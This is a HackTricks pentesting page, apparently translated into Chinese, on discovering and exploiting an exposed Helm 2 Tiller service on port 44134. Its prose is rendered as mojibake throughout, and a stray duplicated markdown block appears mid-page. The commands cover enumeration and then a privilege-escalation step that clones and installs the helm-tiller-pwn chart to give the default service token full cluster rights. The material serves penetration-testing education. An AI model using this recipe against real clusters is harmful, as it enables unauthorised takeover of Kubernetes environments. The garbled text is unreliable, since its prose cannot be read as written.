<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


# åŸºæœ¬ä¿¡æ¯

Helmæ˜¯Kubernetesçš„**åŒ…ç®¡ç†å™¨**ã€‚å®ƒå…è®¸æ‰“åŒ…YAMLæ–‡ä»¶å¹¶åœ¨å…¬å…±å’Œç§æœ‰ä»“åº“ä¸­åˆ†å‘å®ƒä»¬ã€‚è¿™äº›åŒ…è¢«ç§°ä¸º**Helmå›¾è¡¨**ã€‚**Tiller**æ˜¯é»˜è®¤åœ¨ç«¯å£44134**è¿è¡Œ**çš„**æœåŠ¡**ï¼Œæä¾›æœåŠ¡ã€‚

**é»˜è®¤ç«¯å£ï¼š**44134
```
PORT      STATE SERVICE VERSION
44134/tcp open  unknown
```
# æšä¸¾

å¦‚æœæ‚¨èƒ½å¤Ÿ**æšä¸¾ä¸åŒå‘½åç©ºé—´çš„ pods å’Œ/æˆ–æœåŠ¡**ï¼Œè¯·æšä¸¾å®ƒä»¬ï¼Œå¹¶æœç´¢åç§°ä¸­å«æœ‰ **"tiller"** çš„æœåŠ¡ï¼š
```bash
kubectl get pods | grep -i "tiller"
kubectl get services | grep -i "tiller"
kubectl get pods -n kube-system | grep -i "tiller"
kubectl get services -n kube-system | grep -i "tiller"
kubectl get pods -n <namespace> | grep -i "tiller"
kubectl get services -n <namespace> | grep -i "tiller"
```
```markdown
# æ¸—é€æµ‹è¯• Tiller (Helm çš„æœåŠ¡å™¨ç«¯ç»„ä»¶)

Tiller æ˜¯ Helm çš„æœåŠ¡å™¨ç«¯ç»„ä»¶ï¼Œå®ƒåœ¨ Kubernetes é›†ç¾¤ä¸­è¿è¡Œï¼Œå¹¶å…è®¸ç”¨æˆ·é€šè¿‡ Helm å®¢æˆ·ç«¯ä¸é›†ç¾¤äº¤äº’ã€‚å¦‚æœæœªæ­£ç¡®é…ç½®ï¼ŒTiller å¯èƒ½ä¼šæš´éœ²æ•æ„Ÿä¿¡æ¯æˆ–å…è®¸æœªç»æˆæƒçš„ç”¨æˆ·æ‰§è¡Œå‘½ä»¤ã€‚

## å‘ç° Tiller

è¦å‘ç°é›†ç¾¤ä¸­çš„ Tiller æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```
kubectl --namespace kube-system get pods | grep tiller
```

è¿™å°†åˆ—å‡º kube-system å‘½åç©ºé—´ä¸­çš„æ‰€æœ‰ Tiller podã€‚

## åˆ©ç”¨ Tiller

å¦‚æœ Tiller æœåŠ¡æœªæ­£ç¡®é…ç½®ï¼Œæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿéƒ¨ç½²æ¶æ„å›¾è¡¨æˆ–ä¿®æ”¹ç°æœ‰å›¾è¡¨ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¯èƒ½çš„æ”»å‡»åœºæ™¯ï¼š

- **è¯»å–æ•æ„Ÿä¿¡æ¯**: æ”»å‡»è€…å¯ä»¥å°è¯•è¯»å– Tiller æœåŠ¡çš„ç¯å¢ƒå˜é‡æˆ–é…ç½®æ–‡ä»¶ï¼Œä»¥è·å–æ•æ„Ÿä¿¡æ¯ã€‚
- **æœªç»æˆæƒçš„å‘½ä»¤æ‰§è¡Œ**: å¦‚æœ Tiller æœåŠ¡å…è®¸æœªç»æˆæƒçš„ç”¨æˆ·æ‰§è¡Œå‘½ä»¤ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥æ‰§è¡Œæ¶æ„æ“ä½œã€‚

## ä¿®å¤å»ºè®®

ä¸ºäº†ä¿æŠ¤ Tiller æœåŠ¡ï¼Œåº”è¯¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

- ç¡®ä¿ Tiller ä»…åœ¨éœ€è¦æ—¶è¿è¡Œï¼Œå¹¶ä¸”ä»…ç”±æˆæƒç”¨æˆ·è®¿é—®ã€‚
- ä½¿ç”¨ RBAC (åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶) é™åˆ¶å¯¹ Tiller çš„è®¿é—®ã€‚
- å®šæœŸæ£€æŸ¥ Tiller çš„é…ç½®å’Œæƒé™ï¼Œç¡®ä¿æ²¡æœ‰ä¸å½“çš„æƒé™è®¾ç½®ã€‚

é€šè¿‡é‡‡å–è¿™äº›é¢„é˜²æªæ–½ï¼Œå¯ä»¥å‡å°‘ Tiller æœåŠ¡è¢«æ”»å‡»çš„é£é™©ã€‚
```
```bash
kubectl get pods -n kube-system
NAME                                       READY   STATUS             RESTARTS   AGE
kube-scheduler-controlplane                1/1     Running            0          35m
tiller-deploy-56b574c76d-l265z             1/1     Running            0          35m

kubectl get services -n kube-system
NAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE
kube-dns        ClusterIP   10.96.0.10     <none>        53/UDP,53/TCP,9153/TCP   35m
tiller-deploy   ClusterIP   10.98.57.159   <none>        44134/TCP                35m
```
æ‚¨è¿˜å¯ä»¥å°è¯•æ£€æŸ¥ç«¯å£44134æ¥æŸ¥æ‰¾æ­¤æœåŠ¡æ˜¯å¦æ­£åœ¨è¿è¡Œï¼š
```bash
sudo nmap -sS -p 44134 <IP>
```
ä¸€æ—¦å‘ç°æœåŠ¡ï¼Œæ‚¨å¯ä»¥é€šè¿‡ä¸‹è½½å®¢æˆ·ç«¯ helm åº”ç”¨ç¨‹åºä¸ä¹‹é€šä¿¡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨åƒ `homebrew` è¿™æ ·çš„å·¥å…·ï¼Œæˆ–æŸ¥çœ‹[**å®˜æ–¹å‘å¸ƒé¡µé¢**](https://github.com/helm/helm/releases)**ã€‚** æ›´å¤šè¯¦æƒ…ï¼Œæˆ–å…¶ä»–é€‰é¡¹ï¼Œè¯·å‚é˜…[å®‰è£…æŒ‡å—](https://v2.helm.sh/docs/using_helm/#installing-helm)ã€‚

ç„¶åï¼Œæ‚¨å¯ä»¥**æšä¸¾æœåŠ¡**ï¼š
```
helm --host tiller-deploy.kube-system:44134 version
```
## æƒé™æå‡

é»˜è®¤æƒ…å†µä¸‹ï¼Œ**Helm2** å®‰è£…åœ¨å…·æœ‰**é«˜æƒé™**çš„ **namespace kube-system** ä¸­ï¼Œæ‰€ä»¥å¦‚æœä½ æ‰¾åˆ°äº†è¯¥æœåŠ¡å¹¶ä¸”èƒ½å¤Ÿè®¿é—®å®ƒï¼Œè¿™å¯èƒ½å…è®¸ä½ **æå‡æƒé™**ã€‚

ä½ éœ€è¦åšçš„å°±æ˜¯å®‰è£…åƒè¿™æ ·çš„åŒ…ï¼š[**https://github.com/Ruil1n/helm-tiller-pwn**](https://github.com/Ruil1n/helm-tiller-pwn)ï¼Œå®ƒå°†ç»™äºˆ**é»˜è®¤æœåŠ¡ä»¤ç‰Œè®¿é—®æ•´ä¸ªé›†ç¾¤ä¸­çš„æ‰€æœ‰å†…å®¹ã€‚**
```
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
/pwnchart
```
åœ¨[http://rui0.cn/archives/1573](http://rui0.cn/archives/1573)ä¸­ä½ å¯ä»¥æ‰¾åˆ°**æ”»å‡»çš„è§£é‡Š**ï¼Œä½†åŸºæœ¬ä¸Šï¼Œå¦‚æœä½ é˜…è¯»_helm-tiller-pwn/pwnchart/templates/_ä¸­çš„[**clusterrole.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrole.yaml)å’Œ[**clusterrolebinding.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrolebinding.yaml)æ–‡ä»¶ï¼Œä½ å¯ä»¥çœ‹åˆ°**æ‰€æœ‰æƒé™éƒ½è¢«èµ‹äºˆäº†é»˜è®¤token**ã€‚

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºè‹±é›„ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–è€…**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>
